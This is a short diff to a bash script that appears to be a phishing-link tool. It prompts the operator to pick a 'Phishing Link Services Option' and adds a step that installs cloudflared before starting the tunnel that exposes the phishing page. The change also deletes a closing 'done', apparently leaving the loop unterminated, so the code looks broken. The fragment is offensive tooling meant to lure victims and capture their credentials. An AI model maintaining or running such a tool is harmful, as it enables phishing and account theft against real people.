@@ -73,6 +73,7 @@ echo " "
 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[92m You Want to Choose Phishing Link Services Option : \e[97m ' portfrd
 if [[ $portfrd == "1" || $portfrd == "01" || $portfrd == "cloudflare" ]]; then
 echo ""
+install_cloudflared
 start_cloudflared
 clear
 logo_last
@@ -1090,4 +1091,4 @@ logo_text
 			   
 echo ""
                  
-                         done
+                     
